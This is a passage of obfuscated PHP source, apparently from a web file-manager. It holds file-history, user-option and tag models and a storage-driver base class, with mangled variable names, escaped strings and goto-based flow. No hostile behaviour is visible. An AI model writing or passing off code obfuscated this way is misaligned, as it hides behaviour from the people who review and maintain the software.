"{$ëÂ¦úÃÕ}\x69\157\137\x66\x69\154\145\x20\x66\x69\x6c\x65\163\x20\157\x6e\x20\146\x69\x6c\x65\163\x2e\x66\x69\154\145\111\104\x20\x3d\40\150\151\x73\x74\x6f\x72\x79\x2e\x66\x69\154\x65\111\104"; return $this->alias($ó“šÅÀ[2113])->where(array($ó“šÅÀ[419] => $©‡ĞÒƒ))->join($òœ“¶„‰, $ó“šÅÀ[2114])->find(); } public function removeItem($ùã’Å­•) { $§Ïß×· =& $_SERVER[Îûáû“ş]; $ÑÙ‰‰åà = array($§Ïß×·[419] => $ùã’Å­•); $Œ²±Úö™ = $this->where($ÑÙ‰‰åà)->find(); if ($Œ²±Úö™) { $—­ï»å = $this->where($ÑÙ‰‰åà)->delete(); Model($§Ïß×·[471])->remove($Œ²±Úö™[$§Ïß×·[468]]); return $—­ï»å; } return !1; } public function removeBySource($ÊşÇé½ß) { $¡›“ß¸© =& $_SERVER[Îûáû“ş]; if (!$ÊşÇé½ß) { return !1; } if (!is_array($ÊşÇé½ß)) { $ÊşÇé½ß = array($ÊşÇé½ß); } $“Şúä¾Ï = array($¡›“ß¸©[417] => array($¡›“ß¸©[7], $ÊşÇé½ß)); $ì³÷Åğ = $this->field($¡›“ß¸©[469])->where($“Şúä¾Ï)->select(); if ($ì³÷Åğ) { $this->where($“Şúä¾Ï)->delete(); $¬ëìçßĞ = array_to_keyvalue($ì³÷Åğ, $¡›“ß¸©[12], $¡›“ß¸©[468]); Model($¡›“ß¸©[471])->remove($¬ëìçßĞ); } return !0; } public function setDetail($¨°ƒ—¿ß, $çûıê«¢) { $¸²œÍ“™ =& $_SERVER[Îûáû“ş]; return $this->where(array($¸²œÍ“™[419] => $¨°ƒ—¿ß))->save(array($¸²œÍ“™[2104] => $çûıê«¢)); } public function rollbackToItem($’³Æ´Î, $Ùî¡ùÉ) { $•²‰É¨Õ =& $_SERVER[Îûáû“ş]; $Ôî„¤Õ± = Model($•²‰É¨Õ[824])->sourceInfo($’³Æ´Î); $this->addHistory($Ôî„¤Õ±, LNG($•²‰É¨Õ[2115])); $ï—ºøí = $this->find($Ùî¡ùÉ); $÷äš¢ = array($•²‰É¨Õ[468] => $ï—ºøí[$•²‰É¨Õ[468]], $•²‰É¨Õ[76] => $ï—ºøí[$•²‰É¨Õ[76]], $•²‰É¨Õ[85] => time(), $•²‰É¨Õ[456] => USER_ID); Model($•²‰É¨Õ[824])->where(array($•²‰É¨Õ[402] => $’³Æ´Î))->save($÷äš¢); return $this->where(array($•²‰É¨Õ[419] => $Ùî¡ùÉ))->delete(); } public function clearSame($º˜«íÃ) { $éøî®î¸ =& $_SERVER[Îûáû“ş]; $˜ÛÜ©— = $this->listData($º˜«íÃ); $ãõñâ“† = array_to_keyvalue_group($˜ÛÜ©—, $éøî®î¸[468]); $­­ÎæóÄ = array(); $›ÛşÆá„ = array(); foreach ($ãõñâ“† as $•ŸôÆìš) { if (!$•ŸôÆìš || count($•ŸôÆìš) <= 1) { continue; } foreach ($•ŸôÆìš as $üÒ±€È’) { $­­ÎæóÄ[] = $üÒ±€È’[$éøî®î¸[468]]; $›ÛşÆá„[] = $üÒ±€È’[$éøî®î¸[399]]; } } if (!$›ÛşÆá„) { return; } $this->where(array($éøî®î¸[399] => array($éøî®î¸[7], $›ÛşÆá„)))->delete(); Model($éøî®î¸[471])->remove($­­ÎæóÄ); } public function userSpace() { $¯Û€ÀÓ =& $_SERVER[Îûáû“ş]; $î¹ˆÜ¯‰ = $this->tablePrefix; $«åé•ÌÎ = array($¯Û€ÀÓ[1661] => USER_ID); $Ãúòù˜î = "{$î¹ˆÜ¯‰}\151\x6f\x5f\146\151\x6c\145\x20\146\151\x6c\145\x73\40\x6f\x6e\40\x66\x69\x6c\145\x73\56\146\x69\154\x65\111\x44\x20\75\x20\150\151\163\164\x6f\162\171\56\146\x69\x6c\145\x49\104"; return $this->alias($¯Û€ÀÓ[2113])->where($«åé•ÌÎ)->join($Ãúòù˜î, $¯Û€ÀÓ[2114])->sum($¯Û€ÀÓ[76]); } } goto aò‚–•­Àî; d‘Ìí°ò´: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\x6f\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($é‰âÙæ) { $æ÷ê™Æê =& $_SERVER[Îûáû“ş]; $î¬ªô˜í = defined($æ÷ê™Æê[2139]) && USER_ID ? USER_ID : $æ÷ê™Æê[12]; return "\125\163\x65\x72\117\x70\164\151\x6f\x6e\137{$é‰âÙæ}\x5f" . $î¬ªô˜í; } protected function filterWhere($¿Ïæµå) { $æÚö”æç =& $_SERVER[Îûáû“ş]; $¿Ïæµå[$æÚö”æç[1670]] = defined($æÚö”æç[2139]) && USER_ID ? USER_ID : $æÚö”æç[12]; return $¿Ïæµå; } public function cacheRemoveUser($£¯í‹Ï¯, $ÒÒş¹Ìƒ) { return Cache::remove("\125\x73\x65\x72\x4f\160\x74\x69\x6f\x6e\x5f{$£¯í‹Ï¯}\x5f" . $ÒÒş¹Ìƒ); } protected function optionDefault($Á§«èò = '') { $Ï²À²·” =& $_SERVER[Îûáû“ş]; if ($Á§«èò == $Ï²À²·”[12]) { return $GLOBALS[$Ï²À²·”[6]][$Ï²À²·”[2353]]; } if ($Á§«èò == $Ï²À²·”[2354]) { return $GLOBALS[$Ï²À²·”[6]][$Ï²À²·”[2355]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\x74\x61\147\x4c\151\163\164"; public $modelType = "\125\163\x65\162\117\160\164\x69\157\156"; public $field = array("\156\141\155\145", "\x73\x74\171\154\x65", "\x73\157\162\164"); public function listData($óã¾¾¯ = false, $„ş¥ÉÙ» = "\x73\x6f\x72\x74", $ğş·‘ğË = false) { return parent::listData($óã¾¾¯, $„ş¥ÉÙ», $ğş·‘ğË); } public function remove($Ë©ÆüÖ×) { return parent::remove($Ë©ÆüÖ×); } public function add($ğØ×È², $üø‚Úİ” = "\154\141\142\145\x6c\x2d\x67\x72\x65\x79\55\156\x6f\162\155\141\154") { $Ê½Üòê =& $_SERVER[Îûáû“ş]; if ($this->findByName($ğØ×È²)) { return !1; } $Ç¨Ó¢½ = array($Ê½Üòê[420] => $ğØ×È², $Ê½Üòê[484] => $üø‚Úİ”, $Ê½Üòê[1865] => $this->getSort($Ê½Üòê[258]) + 1); return parent::insert($Ç¨Ó¢½); } public function update($»Û€ĞÆí, $¥î¼¹ÑÛ) { $æÕ€³¶Ì =& $_SERVER[Îûáû“ş]; $Ïå¡ş† = $this->listData($»Û€ĞÆí); $¿ƒùáÛ— = $this->findByName($¥î¼¹ÑÛ[$æÕ€³¶Ì[32]]); if (!$Ïå¡ş† || $¿ƒùáÛ— && $¿ƒùáÛ—[$æÕ€³¶Ì[399]] != $Ïå¡ş†[$æÕ€³¶Ì[399]]) { return !1; } return parent::update($»Û€ĞÆí, $¥î¼¹ÑÛ); } public function moveTop($ô Óø†Æ) { $‡Ùœ±íÇ =& $_SERVER[Îûáû“ş]; $—…‰ñ®’ = parent::listData(); $´…£Ï¢ğ = $this->getSort($‡Ùœ±íÇ[257]); foreach ($—…‰ñ®’ as &$áÖ·µŸù) { if ($áÖ·µŸù[$‡Ùœ±íÇ[399]] == $ô Óø†Æ) { $áÖ·µŸù[$‡Ùœ±íÇ[1885]] = $´…£Ï¢ğ; continue; } $áÖ·µŸù[$‡Ùœ±íÇ[1885]] += 1; } unset($áÖ·µŸù); return parent::resetData($—…‰ñ®’); } public function moveBottom($•èŸª×–) { $¾Á¿Ê‹ú =& $_SERVER[Îûáû“ş]; $Éœ£ò’š = $this->getSort($¾Á¿Ê‹ú[258]) + 1; return parent::update($•èŸª×–, array($¾Á¿Ê‹ú[1885] => $Éœ£ò’š)); } public function resetSort($ô—İñ§á) { $ª”€Â¹¢ =& $_SERVER[Îûáû“ş]; $˜º‹ƒµ = array(); $ô—İñ§á = is_array($ô—İñ§á) ? $ô—İñ§á : array(); for ($ì°âÁ°‰ = 0; $ì°âÁ°‰ < count($ô—İñ§á); $ì°âÁ°‰++) { $˜º‹ƒµ[$ô—İñ§á[$ì°âÁ°‰] . $ª”€Â¹¢[12]] = $ì°âÁ°‰ + 1; } $ÍæË–‹à = parent::listData(); foreach ($ÍæË–‹à as &$’ñ–ÂÕè) { $Çñº’ºÄ = $˜º‹ƒµ[$’ñ–ÂÕè[$ª”€Â¹¢[399]]]; $’ñ–ÂÕè[$ª”€Â¹¢[1885]] = $Çñº’ºÄ ? $Çñº’ºÄ : $’ñ–ÂÕè[$ª”€Â¹¢[1885]]; } unset($’ñ–ÂÕè); return parent::resetData($ÍæË–‹à); } private function getSort($Ş¿¤ çÙ) { $ØıÊ­É‰ =& $_SERVER[Îûáû“ş]; $¾–·ìå´ = parent::listData(); $î‰õ³¡ô = array_to_keyvalue($¾–·ìå´, $ØıÊ­É‰[12], $ØıÊ­É‰[1885]); if (!$î‰õ³¡ô) { $î‰õ³¡ô = array(0); } $©Ô€­òŠ = $Ş¿¤ çÙ == $ØıÊ­É‰[258] ? max($î‰õ³¡ô) : min($î‰õ³¡ô); return intval($©Ô€­òŠ); } } goto e—¦·ï÷Ÿ–; e‹®ºâ·Îä: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $œü“Æç =& $_SERVER[Îûáû“ş]; $this->objectDriver = array($œü“Æç[60], $œü“Æç[61], $œü“Æç[62], $œü“Æç[63], $œü“Æç[64], $œü“Æç[65], $œü“Æç[66], $œü“Æç[67], $œü“Æç[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($§…°Î¬¨) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($§…°Î¬¨, $_SERVER[Îûáû“ş][8]); } return $§…°Î¬¨; } public function iconvApp($„„şñ­è) { return $„„şñ­è; } public function iconvSystem($€ØòÀ©ş) { return $€ØòÀ©ş; } public function iconvTo($Ìµ—Ê½ø, $€‹ÔÅ»ë, $÷‚°Şğì) { $ŸÜË©ˆ” =& $_SERVER[Îûáû“ş]; if (!$Ìµ—Ê½ø || !function_exists($ŸÜË©ˆ”[69])) { return $Ìµ—Ê½ø; } static $¯§Ş°ÚÏ = array(); $¨„Ğ–¦ñ = $€‹ÔÅ»ë . $ŸÜË©ˆ”[70] . $÷‚°Şğì . $ŸÜË©ˆ”[71] . $Ìµ—Ê½ø; if (isset($¯§Ş°ÚÏ[$¨„Ğ–¦ñ])) { return $¯§Ş°ÚÏ[$¨„Ğ–¦ñ]; } if (function_exists($ŸÜË©ˆ”[72])) { $éäë¡Âş = @mb_convert_encoding($Ìµ—Ê½ø, $÷‚°Şğì, $€‹ÔÅ»ë); } else { $éäë¡Âş = @iconv($€‹ÔÅ»ë, $÷‚°Şğì, $Ìµ—Ê½ø); } $éäë¡Âş = $éäë¡Âş ? $éäë¡Âş : $Ìµ—Ê½ø; if (strstr($éäë¡Âş, $ŸÜË©ˆ”[73])) { $éäë¡Âş = str_replace($ŸÜË©ˆ”[73], $ŸÜË©ˆ”[11], $éäë¡Âş); } $¯§Ş°ÚÏ[$€‹ÔÅ»ë . $ŸÜË©ˆ”[70] . $÷‚°Şğì . $ŸÜË©ˆ”[71] . $Ìµ—Ê½ø] = $éäë¡Âş; $¯§Ş°ÚÏ[$÷‚°Şğì . $ŸÜË©ˆ”[70] . $€‹ÔÅ»ë . $ŸÜË©ˆ”[71] . $Ìµ—Ê½ø] = $Ìµ—Ê½ø; $¯§Ş°ÚÏ[$÷‚°Şğì . $ŸÜË©ˆ”[70] . $€‹ÔÅ»ë . $ŸÜË©ˆ”[71] . $éäë¡Âş] = $Ìµ—Ê½ø; $¯§Ş°ÚÏ[$€‹ÔÅ»ë . $ŸÜË©ˆ”[70] . $÷‚°Şğì . $ŸÜË©ˆ”[71] . $éäë¡Âş] = $éäë¡Âş; return $éäë¡Âş; } public function getPathInner($—„«öì¾) { $şø»¶Óá = IO::init($—„«öì¾); return $şø»¶Óá->path; } public function getPathOuter($ßüğÀ»¡) { $äÀ×ú˜ =& $_SERVER[Îûáû“ş]; $şÃéæÀ = strlen(trim($this->pathBase, $äÀ×ú˜[8])); $ßüğÀ»¡ = substr(trim($ßüğÀ»¡, $äÀ×ú˜[8]), $şÃéæÀ); return $this->pathDriver . $äÀ×ú˜[8] . ltrim($ßüğÀ»¡, $äÀ×ú˜[8]); } public function isParentOf($ŸŒ¼ïòÈ, $»«‘­ó) { $Ñ·Òüìà =& $_SERVER[Îûáû“ş]; $ŸŒ¼ïòÈ = rtrim(strtolower($ŸŒ¼ïòÈ), $Ñ·Òüìà[8]) . $Ñ·Òüìà[8]; $»«‘­ó = rtrim(strtolower($»«‘­ó), $Ñ·Òüìà[8]) . $Ñ·Òüìà[8]; $éıÛº = strpos($»«‘­ó, $ŸŒ¼ïòÈ) === 0; return $éıÛº; } public function getType() { $¦×Œ§ =& $_SERVER[Îûáû“ş]; $—±°¡Ÿ× = str_replace($¦×Œ§[74], $¦×Œ§[12], get_class($this)); return strtolower($—±°¡Ÿ×); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ì¶úó‹, $¦ÃÍôÈµ) { $·öß‡á´ =& $_SERVER[Îûáû“ş]; $‰Ëşµ¬ = rtrim($Ì¶úó‹, $·öß‡á´[8]) . $·öß‡á´[8] . $¦ÃÍôÈµ; $“¯ÛäìĞ = $this->exist($‰Ëşµ¬); return $“¯ÛäìĞ ? $‰Ëşµ¬ : !1; } public function setModifyTime($õçÃ÷¡‰, $‹ûÖ÷ôâ = '') { } public function renameObject($§Š¼÷‰¯, $óÑ¿¯‘§) { $±Êäéöµ = $óÑ¿¯‘§; $§Š¼÷‰¯ = $this->getPathOuter($§Š¼÷‰¯); $óÑ¿¯‘§ = $this->pathFather($§Š¼÷‰¯) . $óÑ¿¯‘§; $€òäâÁ = IO::copy($§Š¼÷‰¯, $this->pathFather($§Š¼÷‰¯), REPEAT_RENAME_FOLDER, $±Êäéöµ); if ($€òäâÁ) { IO::remove($§Š¼÷‰¯); } return $€òäâÁ ? $óÑ¿¯‘§ : !1; } public function tempFile($ÔË÷¯èÀ = '', $šÛÛŒÃ = '') { if (!$ÔË÷¯èÀ) { $ÔË÷¯èÀ = rand_string(15); } $©Ğ¢º´á = TEMP_FILES . rand_string(15) . $_SERVER[Îûáû“ş][8]; @mkdir($©Ğ¢º´á, DEFAULT_PERRMISSIONS, !0); $ë˜‚”ºÀ = $©Ğ¢º´á . $ÔË÷¯èÀ; @touch($ë˜‚”ºÀ); if ($šÛÛŒÃ) { file_put_contents($ë˜‚”ºÀ, $šÛÛŒÃ); } return $ë˜‚”ºÀ; } public function tempFileRemve($ÊŞ«Ãé¡) { @unlink($ÊŞ«Ãé¡); @rmdir($this->pathFather($ÊŞ«Ãé¡)); } public function mkfile($ú¶üßäŠ, $¾‹¥çÁ = '', $á¢æˆ„Ö = REPEAT_RENAME) { } public function mkdir($Ÿã¹ı“•, $üÅáÛÓÜ = REPEAT_SKIP) { } public function delFile($Ÿñõ¦‰–) { } public function delFolder($³ˆÅá») { } public function copyFile($Úæí‹•Ä, $ŞºĞ‹”Ã) { } public function moveFile($‚ãšÛÆ¶, $Ú†ûÚ°ë) { } public function remove($¶šÚÊ®“) { if ($this->isFile($¶šÚÊ®“)) { return $this->delFile($¶šÚÊ®“); } return $this->delFolder($¶šÚÊ®“); } public function rename($ÍÁ€»¼Á, $èíÃØ§é) { } public function exist($šşÔîî) { } public function findByHash($¬ü·½å  = '', $Ôµƒ—‚ô = '') { return !1; } public function isFile($§º¬ÕÌ·) { } public function isFolder($ÓÂÜŒÌ) { } public function size($çÖ¾§›) { } public function info($ÆÖö»À) { } public function infoSimple($ãµØá™ß) { return $this->info($ãµØá™ß); } public function infoAuth($Ÿ¥èÚ¥) { return $this->info($Ÿ¥èÚ¥); } public function infoFull($™„ÕŞÛ) { return $this->info($™„ÕŞÛ); } public function infoWithChildren($ƒ§š„’—) { $é÷©ø  =& $_SERVER[Îûáû“ş]; static $åşŸÏ„ = array(); if (isset($åşŸÏ„[$ƒ§š„’—])) { return $åşŸÏ„[$ƒ§š„’—]; } $‚”åşœª = $this->info($ƒ§š„’—); if ($‚”åşœª && $‚”åşœª[$é÷©ø [33]] == $é÷©ø [75]) { $ê€Ÿ”ÑÛ = array($é÷©ø [76] => 0, $é÷©ø [77] => 0, $é÷©ø [78] => 0); $this->infoChildren($ƒ§š„’—, $ê€Ÿ”ÑÛ); $‚”åşœª[$é÷©ø [76]] = $ê€Ÿ”ÑÛ[$é÷©ø [76]]; $‚”åşœª[$é÷©ø [79]] = array($é÷©ø [80] => $ê€Ÿ”ÑÛ[$é÷©ø [77]], $é÷©ø [81] => $ê€Ÿ”ÑÛ[$é÷©ø [78]]); $åşŸÏ„[$ƒ§š„’—] = $‚”åşœª; } return $‚”åşœª; } public function listPath($Ç€ØˆÆ¦, $½Ù³Ãº = false) { } public function has($ë²¨ìµ‰, $ïÉÚúû = false, $å§ÇîÓ = false) { } public function canRead($ºå¹™´) { } public function canWrite($ÇĞÔ‰Ñí) { } public function getContent($°…ƒ¬õ¸) { } public function setContent($¢†áîÇĞ, $É¼¬ßŞ² = '') { } protected function infoChildren($öï¢‰­», &$¦üõ×ÂŠ) { $ôóşñÙâ =& $_SERVER[Îûáû“ş]; check_abort_echo(); $¯ò’›«Ë = $this->listPath($öï¢‰­», !0); $¯ò’›«Ë = array_merge($¯ò’›«Ë[$ôóşñÙâ[82]], $¯ò’›«Ë[$ôóşñÙâ[83]]); foreach ($¯ò’›«Ë as $À÷¶à„×) { if ($À÷¶à„×[$ôóşñÙâ[33]] == $ôóşñÙâ[75]) { $¦üõ×ÂŠ[$ôóşñÙâ[78]]++; $âí±÷Èõ = $this->getPathInner($À÷¶à„×[$ôóşñÙâ[84]]); $this->infoChildren($âí±÷Èõ, $¦üõ×ÂŠ); } else { $¦üõ×ÂŠ[$ôóşñÙâ[77]]++; $¦üõ×ÂŠ[$ôóşñÙâ[76]] += $À÷¶à„×[$ôóşñÙâ[76]]; } } } public function fileSubstr($ƒæÃ¡–‘, $šü˜©å, $ÓÜ»‰ÅØ) { } public function listAll($Ïª£Ôüá) { } public function listAllMake($˜ÄÂ’ˆ, &$ûà°¾şí) { $Éøê´Ö´ =& $_SERVER[Îûáû“ş]; check_abort_echo(); $ò¾ÔÜÕ¯ = $this->listPath($˜ÄÂ’ˆ, !0); if (!$ò¾ÔÜÕ¯) { return; } $ñ¬Ûî‚× = array_merge($ò¾ÔÜÕ¯[$Éøê´Ö´[82]], $ò¾ÔÜÕ¯[$Éøê´Ö´[83]]); foreach ($ñ¬Ûî‚× as $øÜéò—”) { $ÏƒŒ¨ = $øÜéò—”[$Éøê´Ö´[33]] == $Éøê´Ö´[75]; $øº”½‹ğ = array($Éøê´Ö´[84] => $øÜéò—”[$Éøê´Ö´[84]], $Éøê´Ö´[75] => $ÏƒŒ¨); if (isset($øÜéò—”[$Éøê´Ö´[76]])) { $øº”½‹ğ[$Éøê´Ö´[76]] = $øÜéò—”[$Éøê´Ö´[76]]; } if (isset($øÜéò—”[$Éøê´Ö´[85]])) { $øº”½‹ğ[$Éøê´Ö´[85]] = $øÜéò—”[$Éøê´Ö´[85]]; } if (!$ÏƒŒ¨) { $ûà°¾şí[] = $øº”½‹ğ; continue; } $ûà°¾şí[] = $øº”½‹ğ; $é¿Ø­³ = $øÜéò—”[$Éøê´Ö´[84]]; $ºÊàäâù = $this->pathDriver; if (substr($øÜéò—”[$Éøê´Ö´[84]], 0, strlen($ºÊàäâù)) == $ºÊàäâù) { $é¿Ø­³ = substr($é¿Ø­³, strlen($ºÊàäâù)); } $this->listAllMake($é¿Ø­³, $ûà°¾şí); } } public function listAllSimple($ĞçôŠ•³, $‚ÛŸ—Ê÷ = false) { $ü™ğâ÷¤ = $this->listAll($ĞçôŠ•³); return $this->listAllSimpleMake($ü™ğâ÷¤, $this->getPathOuter($ĞçôŠ•³), $‚ÛŸ—Ê÷); } public function listAllSimpleMake($©íÃñİ, $Ñ„“ô¿ë, $‹ŸÊÈæÓ) { $ÁØ±ˆ­½ =& $_SERVER[Îûáû“ş]; $¢ÁÙ¢ = array(); $Ñ„“ô¿ë = rtrim(get_path_father($Ñ„“ô¿ë), $ÁØ±ˆ­½[8]) . $ÁØ±ˆ­½[8]; foreach ($©íÃñİ as $õı½ÁÊÏ) { $½›—ª±Ô = array($ÁØ±ˆ­½[84] => $õı½ÁÊÏ[$ÁØ±ˆ­½[84]], $ÁØ±ˆ­½[86] => $õı½ÁÊÏ[$ÁØ±ˆ­½[84]], $ÁØ±ˆ­½[75] => $õı½ÁÊÏ[$ÁØ±ˆ­½[75]]); if (isset($õı½ÁÊÏ[$ÁØ±ˆ­½[76]]) && !$õı½ÁÊÏ[$ÁØ±ˆ­½[75]]) { $½›—ª±Ô[$ÁØ±ˆ­½[76]] = $õı½ÁÊÏ[$ÁØ±ˆ­½[76]]; } if (isset($õı½ÁÊÏ[$ÁØ±ˆ­½[85]])) { $½›—ª±Ô[$ÁØ±ˆ­½[85]] = $õı½ÁÊÏ[$ÁØ±ˆ­½[85]]; } if (is_array($õı½ÁÊÏ[$ÁØ±ˆ­½[87]])) { $½›—ª±Ô[$ÁØ±ˆ­½[86]] = $õı½ÁÊÏ[$ÁØ±ˆ­½[87]][$ÁØ±ˆ­½[84]]; $½›—ª±Ô[$ÁØ±ˆ­½[76]] = $õı½ÁÊÏ[$ÁØ±ˆ­½[87]][$ÁØ±ˆ­½[76]]; $½›—ª±Ô[$ÁØ±ˆ­½[85]] = $õı½ÁÊÏ[$ÁØ±ˆ­½[87]][$ÁØ±ˆ­½[85]]; } else { if (substr($õı½ÁÊÏ[$ÁØ±ˆ­½[84]], 0, strlen($Ñ„“ô¿ë)) == $Ñ„“ô¿ë) { $½›—ª±Ô[$ÁØ±ˆ­½[84]] = substr($õı½ÁÊÏ[$ÁØ±ˆ­½[84]], strlen($Ñ„“ô¿ë)); } } $ÌçÄŒ = $õı½ÁÊÏ[$ÁØ±ˆ­½[75]] ? $ÁØ±ˆ­½[8] : $ÁØ±ˆ­½[12]; $½›—ª±Ô[$ÁØ±ˆ­½[86]] = rtrim($½›—ª±Ô[$ÁØ±ˆ­½[86]], $ÁØ±ˆ­½[8]) . $ÌçÄŒ; $½›—ª±Ô[$ÁØ±ˆ­½[84]] = $ÁØ±ˆ­½[8] . trim($½›—ª±Ô[$ÁØ±ˆ­½[84]], $ÁØ±ˆ­½[8]) . $ÌçÄŒ; if (!$‹ŸÊÈæÓ) { $‘’ıÒ£¤ = explode($ÁØ±ˆ­½[8], trim($½›—ª±Ô[$ÁØ±ˆ­½[84]], $ÁØ±ˆ­½[8])); $½›—ª±Ô[$ÁØ±ˆ­½[84]] = $ÁØ±ˆ­½[8] . implode($ÁØ±ˆ­½[8], array_slice($‘’ıÒ£¤, 1)) . $ÌçÄŒ; } $¢ÁÙ¢[] = $½›—ª±Ô; } return array_sort_by($¢ÁÙ¢, $ÁØ±ˆ­½[84]); } public function upload($µÛ¨èü¨, $ĞäÅ…ú½, $¶•ı¢ã = false, $ú°“•’ø = REPEAT_REPLACE) { } public function uploadFileByID($óĞ†­¸Æ, $À÷è‰Æ¸, $Íˆ÷ì›¾) { } public function uploadFileByPath($¸ÓÛ¨, $ÁæËî—, $è’àöÇ = array()) { } public function isUploadServer() { $ìş×†ºÅ =& $_SERVER[Îûáû“ş]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ìş×†ºÅ[88]) { return !0; } return $GLOBALS[$ìş×†ºÅ[6]][$ìş×†ºÅ[89]][$ìş×†ºÅ[90]]; } public function isFileOutServer() { $øõö´½š =& $_SERVER[Îûáû“ş]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $øõö´½š[88]) { return !0; } return $GLOBALS[$øõö´½š[6]][$øõö´½š[89]][$øõö´½š[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¦æ¬Õ®·) { $øîğÛğ =& $_SERVER[Îûáû“ş]; if (!$this->isCdnHost()) { return $¦æ¬Õ®·; } return str_replace(trim(get_url_root($¦æ¬Õ®·), $øîğÛğ[8]), trim($this->cdnHost, $øîğÛğ[8]), $¦æ¬Õ®·); } public function uploadLink($¨ŠÔ¼Õ, $›ú—õí‘ = 0) { $¦£‡´ƒ =& $_SERVER[Îûáû“ş]; if ($this->isUploadServer()) { return; } $Ó‰ìÈ = $this->getType(); if (!in_array($Ó‰ìÈ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $µ€Ä°¸ø = 1024 * 1024 * 10; $¬ñÑŸÏÓ = $›ú—õí‘ <= $µ€Ä°¸ø ? $¦£‡´ƒ[92] : $¦£‡´ƒ[93]; $ô…Şôˆ = (!$›ú—õí‘ ? 1 : ceil($›ú—õí‘ / pow(1024, 3))) * 3600 * 4; $Úë¹Í«Ó = $this->{$¬ñÑŸÏÓ}($¨ŠÔ¼Õ, $ô…Şôˆ); if ($Úë¹Í«Ó) { $Úë¹Í«Ó[$¦£‡´ƒ[94]] = $¨ŠÔ¼Õ; $Úë¹Í«Ó[$¦£‡´ƒ[95]] = $Ó‰ìÈ; } return $Úë¹Í«Ó; } public function uploadFormData($ÀŸò“§€, $­§©¹î¾ = 3600) { } public function multiUploadFormData($ã‰Ãèä£, $Î˜‡ë = 3600) { } public function download($ºÇØ¤ï, $ş¸´ä¤…) { } public function ext($¼á”šı“) { $¨£´—¢í =& $_SERVER[Îûáû“ş]; if (strpos($¼á”šı“, $¨£´—¢í[8]) === -1) { $‹ûŒêÒ¥ = $¼á”šı“; } else { $‹ûŒêÒ¥ = $this->pathThis($¼á”šı“); } $¿‘Ã”à¡ = $¨£´—¢í[12]; if (strstr($‹ûŒêÒ¥, $¨£´—¢í[10])) { $¿‘Ã”à¡ = substr($‹ûŒêÒ¥, strrpos($‹ûŒêÒ¥, $¨£´—¢í[10]) + 1); $¿‘Ã”à¡ = strtolower($¿‘Ã”à¡); } if (strlen($¿‘Ã”à¡) > 3 && preg_match($¨£´—¢í[96], $¿‘Ã”à¡, $³†Ã»¹¢)) { $¿‘Ã”à¡ = $¨£´—¢í[12]; } return $¿‘Ã”à¡; } public function pathThis($íÓË¶Ñã) { $ã®×ªÔğ =& $_SERVER[Îûáû“ş]; $íÓË¶Ñã = str_replace($ã®×ªÔğ[97], $ã®×ªÔğ[8], rtrim($íÓË¶Ñã, $ã®×ªÔğ[8])); $¾ÖİÚ é = strrpos($íÓË¶Ñã, $ã®×ªÔğ[8]); if ($¾ÖİÚ é === !1) { return $íÓË¶Ñã; } return substr($íÓË¶Ñã, $¾ÖİÚ é + 1); } public function pathFather($òúÖõ¯) { $¥¿·…ÖÜ =& $_SERVER[Îûáû“ş]; $òúÖõ¯ = str_replace($¥¿·…ÖÜ[97], $¥¿·…ÖÜ[8], rtrim($òúÖõ¯, $¥¿·…ÖÜ[8])); $Š–ê˜ü’ = strrpos($òúÖõ¯, $¥¿·…ÖÜ[8]); if ($Š–ê˜ü’ === !1) { return $¥¿·…ÖÜ[12]; } return substr($òúÖõ¯, 0, $Š–ê˜ü’ + 1); } public function hashSimple($§óÅ›) { $ãâÅĞå² =& $_SERVER[Îûáû“ş]; if (!$§óÅ›) { return md5($ãâÅĞå²[12]); } $«§šÓÃ = $this->size($§óÅ›); $“Ù¡áà° = 200; $à¾¿öë = 50; if ($«§šÓÃ <= $“Ù¡áà° * $à¾¿öë) { return $this->hashMd5($§óÅ›) . $«§šÓÃ; } $–¥’ó = intval($«§šÓÃ / $à¾¿öë); $Ğ÷õÙ¶„ = $ãâÅĞå²[12]; for ($£º¡ú¾ì = 0; $£º¡ú¾ì < $à¾¿öë; $£º¡ú¾ì++) { $Ğ÷õÙ¶„ .= $this->fileSubstr($§óÅ›, $–¥’ó * $£º¡ú¾ì, $“Ù¡áà°); } $Ğ÷õÙ¶„ .= $this->fileSubstr($§óÅ›, $«§šÓÃ - $“Ù¡áà°, $“Ù¡áà°); return md5($Ğ÷õÙ¶„) . $«§šÓÃ; } public static $md5Cache = array(); public function hashMd5($éşéßèŸ) { if (!$éşéßèŸ) { return md5($_SERVER[Îûáû“ş][12]); } $éşéßèŸ = $this->iconvSystem($éşéßèŸ); if (isset(self::$md5Cache[$éşéßèŸ])) { return self::$md5Cache[$éşéßèŸ]; } self::$md5Cache[$éşéßèŸ] = $this->hashMd5Shell($éşéßèŸ); if (!self::$md5Cache[$éşéßèŸ]) { self::$md5Cache[$éşéßèŸ] = @md5_file($éşéßèŸ); } return self::$md5Cache[$éşéßèŸ]; } private function hashMd5Shell($’ˆĞŠÍ¸) { $´ÏÀû =& $_SERVER[Îûáû“ş]; if (!$’ˆĞŠÍ¸) { return md5($´ÏÀû[12]); } if (!function_exists($´ÏÀû[98])) { return !1; } $«ŸòèÔø = array($´ÏÀû[99], $´ÏÀû[100]); $úÌúÀ©¾ = Cache::get($´ÏÀû[101]); if (!$úÌúÀ©¾) { $µ†ç¥Ö = BASIC_PATH . $´ÏÀû[102]; $‰¯üêõ¡ = md5_file($µ†ç¥Ö); $úÌúÀ©¾ = $´ÏÀû[103]; foreach ($«ŸòèÔø as $•‡µÄà£) { $³½Ó À³ = shell_exec($•‡µÄà£ . "\40\x22{$µ†ç¥Ö}\x22"); if ($³½Ó À³ && substr(trim($³½Ó À³), 0, 32) == $‰¯üêõ¡) { $úÌúÀ©¾ = $•‡µÄà£; break; } } Cache::set($´ÏÀû[101], $úÌúÀ©¾, 3600); } if ($úÌúÀ©¾ == 